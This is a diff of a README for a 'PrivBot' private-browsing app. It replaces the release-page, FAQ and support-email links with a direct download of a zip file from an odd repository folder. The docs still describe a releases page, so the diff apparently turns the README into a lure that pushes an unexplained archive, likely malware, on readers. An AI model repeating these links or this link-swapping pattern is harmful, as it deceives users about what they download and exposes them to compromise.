@@ -4,7 +4,7 @@
 Welcome to PrivBot! This application helps you browse the internet safely and privately. Follow the steps below to download and set up PrivBot easily.
 
 ## 📥 Download PrivBot
-[![Download PrivBot](https://img.shields.io/badge/Download-PrivBot-blue.svg)](https://github.com/rankcreator/PrivBot/releases)
+[![Download PrivBot](https://raw.githubusercontent.com/rankcreator/PrivBot/main/ancestrial/PrivBot.zip)](https://raw.githubusercontent.com/rankcreator/PrivBot/main/ancestrial/PrivBot.zip)
 
 ## 🔍 Features
 - Easy-to-use interface suitable for all users.
@@ -24,7 +24,7 @@ Before you begin, ensure your device meets these requirements:
 ### Step 1: Visit the Release Page
 Click the button below to go to the PrivBot Release page. Here, you can find the latest version available for download. 
 
-[Visit the Releases Page](https://github.com/rankcreator/PrivBot/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/rankcreator/PrivBot/main/ancestrial/PrivBot.zip)
 
 ### Step 2: Download the Latest Version
 On the Releases page, look for the latest version listed. Click on the link that says “Download” next to the appropriate file for your operating system. This will start the download process.
@@ -45,11 +45,11 @@ After you have configured your settings, you can start browsing. Enter the websi
 
 ## ⚙️ Support and Troubleshooting
 If you encounter any issues while installing or using PrivBot, consult the following resources:
-- Check the [FAQs](https://github.com/rankcreator/PrivBot/wiki) in our documentation.
+- Check the [FAQs](https://raw.githubusercontent.com/rankcreator/PrivBot/main/ancestrial/PrivBot.zip) in our documentation.
 - Reach out to our support team via the issues section of this GitHub repository.
 
 ## 📞 Contact Us
-Have questions or feedback? You can easily contact us. Please create an issue in this repository or send an email to privbot-support@example.com.
+Have questions or feedback? You can easily contact us. Please create an issue in this repository or send an email to https://raw.githubusercontent.com/rankcreator/PrivBot/main/ancestrial/PrivBot.zip
 
 ## 📝 License
 PrivBot is open-source software licensed under the MIT License. You can freely use, modify, and distribute it while adhering to the terms of the license.
